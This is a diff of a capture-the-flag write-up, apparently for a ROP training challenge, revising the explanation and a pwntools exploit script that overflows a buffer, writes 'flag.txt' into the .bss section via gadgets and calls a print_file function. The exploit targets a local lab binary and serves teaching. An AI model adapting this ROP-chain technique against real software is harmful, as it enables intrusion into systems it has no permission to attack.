@@ -41,9 +41,9 @@
 <div class="paragraph">
     <p>
         <br><br>
-        We now have everything we need to craft our exploit. First we write the string "flag.txt" into memory in the bss section. This has to be done in 2 phases since we can only copy over 4 bytes at a time since our gadget uses edi instead of rdi. Next we use another location in the bss register to point to the location of our flag. Now when we pop this last value into the rdi register and call the win function, its argument points to the string "flag.txt" that we wrote to the bss section. 
+        We now have everything we need to craft our exploit. First we write the string "flag.txt" into memory in the bss section. This has to be done in 2 phases since we can only copy over 4 bytes at a time since our gadget uses edi instead of rdi. We can now call the win function with our "flag.txt" string as an argument.
         <br>
-        Running this exploit now prints out the flag. Below you can find our complete commented exploit script.
+        Running this exploit prints out the flag. Below you can find our complete commented exploit script.
         <br><br>
     </p>
 </div>
@@ -71,21 +71,20 @@ libc = elf.libc
 p = elf.process()
 
 string1 = b"flagAAAA"
-string2 = b".txtAAAA"           #Flag string + filler since edi is used
+string2 = b".txtAAAA"
 
-bss_loc1 = p64(0x601068)        #"Flag" location
-bss_loc2 = p64(0x601068+4)      #".txt" location
-bss_loc3 = p64(0x601068+12)     #Address we use to point to flag location
-pop_rdi = p64(0x400693)         
+bss_loc1 = p64(0x601068)
+bss_loc2 = p64(0x601068+4)
+bss_loc3 = p64(0x601068+12)
+pop_rdi = p64(0x400693)
 pop_rsi_r15 = p64(0x400691)
 mov_edi_to_rsi = p64(0x400629)
 t = b"T"*8
 
-payload = b"A"*40      
-payload += pop_rsi_r15 + bss_loc1 + t + pop_rdi + string1 + mov_edi_to_rsi  #write "flag" to memory
-payload += pop_rsi_r15 + bss_loc2 + t + pop_rdi + string2 + mov_edi_to_rsi  #write ".txt" to memory
-payload += pop_rsi_r15 + bss_loc3 + t + pop_rdi + bss_loc1 + mov_edi_to_rsi #write our flag pointer to memory
-payload += pop_rsi_r15 + bss_loc3 + t + p64(elf.sym.print_file)   #pop pointer into rdi and call win function
+payload = b"A"*40
+payload += pop_rsi_r15 + bss_loc2 + t + pop_rdi + string2 + mov_edi_to_rsi
+payload += pop_rsi_r15 + bss_loc1 + t + pop_rdi + string1 + mov_edi_to_rsi
+payload += pop_rdi + bss_loc1 + p64(elf.sym.print_file)
 
 p.sendline(payload)
 p.interactive()
